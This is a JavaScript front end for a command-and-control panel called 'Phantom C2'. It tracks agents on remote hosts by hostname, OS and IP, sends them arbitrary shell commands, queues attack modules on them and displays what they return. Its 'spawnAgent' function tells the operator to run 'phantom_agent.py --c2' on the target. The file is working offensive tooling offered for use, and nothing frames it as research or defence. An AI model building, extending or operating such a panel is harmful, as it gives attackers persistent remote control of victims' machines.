/* Phantom C2 — socket + UI state */
const socket = io();
let currentAgent = null;

socket.on('connect', () => {
  appendEvent('system', 'WebSocket connected');
});

socket.on('agent_connected', (agent) => {
  appendEvent('connect', `Agent ${agent.id} connected — ${agent.hostname}`);
  refreshAgents();
});

socket.on('new_command', (data) => {
  appendEvent('command', `Issued ${data.cmd} to ${data.aid}`);
  refreshAgents();
});

socket.on('command_result', (data) => {
  appendEvent('result', `Result from ${data.aid}`);
  if (currentAgent === data.aid) renderResult(data);
  refreshAgents();
});

async function refreshAgents() {
  const res = await fetch('/api/agents');
  const agents = await res.json();
  const list = document.getElementById('agentList');
  list.innerHTML = '';
  agents.forEach(a => {
    const card = document.createElement('div');
    card.className = 'agent-card' + (currentAgent === a.id ? ' active' : '');
    const dot = a.connected ? '<span class="dot-green">●</span>' : '<span class="dot-red">●</span>';
    card.innerHTML = `<div>${dot} <span class="name">${a.hostname}</span> <span class="dots"></span></div>
      <div class="meta">${a.id} · ${a.os} · ${a.ip}</div>`;
    card.onclick = () => selectAgent(a.id);
    list.appendChild(card);
  });
}

function selectAgent(aid) {
  currentAgent = aid;
  document.getElementById('currentAid').textContent = aid;
  document.getElementById('cmdInput').disabled = false;
  document.querySelector('.prompt').textContent = `root@phantom:${aid}#`;
  refreshAgents();
  fetch(`/api/results/${aid}`).then(r => r.json()).then(rows => {
    const out = document.getElementById('output');
    out.textContent = '────── RESULTS ──────\n';
    rows.forEach(r => {
      out.textContent += `[${new Date(r.received_at*1000).toISOString()}] ${r.type||'result'}\n`;
      if (r.output) out.textContent += r.output;
      if (r.error) out.textContent += 'ERR: ' + r.error;
      out.textContent += '\n';
    });
    out.scrollTop = out.scrollHeight;
  });
}

async function sendCommand() {
  const inp = document.getElementById('cmdInput');
  const cmd = inp.value.trim();
  if (!cmd || !currentAgent) return;
  appendToTerminal(`$ ${cmd}`);
  const res = await fetch(`/api/agent/${currentAgent}/command`, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({cmd:'shell', args:[cmd]})
  });
  const data = await res.json();
  inp.value = '';
  appendToTerminal(`[queued] command_id=${data.command_id}`);
}

function appendToTerminal(text) {
  const out = document.getElementById('output');
  out.textContent += (out.textContent ? '\n' : '') + text;
  out.scrollTop = out.scrollHeight;
}

function renderResult(data) {
  appendToTerminal(`\n────── RETURN ──────`);
  appendToTerminal(JSON.stringify(data, null, 2));
}

async function loadModules() {
  const res = await fetch('/api/modules');
  const modules = await res.json();
  const ul = document.getElementById('moduleList');
  ul.innerHTML = '';
  for (const [key, m] of Object.entries(modules)) {
    const li = document.createElement('li');
    li.innerHTML = `<span>${m.name}</span> <span class="key">${key}</span>`;
    li.onclick = () => selectModule(key);
    ul.appendChild(li);
  }
}

function selectModule(name) {
  document.getElementById('moduleName').value = name;
  const form = document.getElementById('moduleForm');
  form.style.display = 'block';
}

async function runModule() {
  const name = document.getElementById('moduleName').value;
  if (!name || !currentAgent) return;
  const body = {};
  document.querySelectorAll('#moduleForm input').forEach(inp => {
    if (inp.value.trim()) body[inp.dataset.key || inp.id] = inp.value.trim();
  });
  const res = await fetch(`/api/agent/${currentAgent}/module/${name}`, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(body)
  });
  const data = await res.json();
  appendEvent('module', `Module ${name} queued on ${currentAgent}`);
}

function appendEvent(type, text) {
  const log = document.getElementById('eventLog');
  const ts = new Date().toTimeString().slice(0,8);
  const div = document.createElement('div');
  div.className = 'ev';
  div.innerHTML = `<span class="ts">[${ts}]</span> <span class="type-${type}">${text}</span>`;
  log.prepend(div);
}

function spawnAgent() {
  const c2 = window.location.origin;
  const code = `python3 phantom_agent.py --c2 ${c2}`;
  const out = document.getElementById('output');
  out.textContent += `\n────── AGENT BUILD ──────\n`;
  out.textContent += `Run this on target:\n>>> ${code}\n`;
  out.scrollTop = out.scrollHeight;
}

document.getElementById('cmdInput').addEventListener('keydown', (e) => {
  if (e.key === 'Enter') sendCommand();
});

window.addEventListener('DOMContentLoaded', () => {
  refreshAgents();
  loadModules();
  setInterval(refreshAgents, 3000);
});
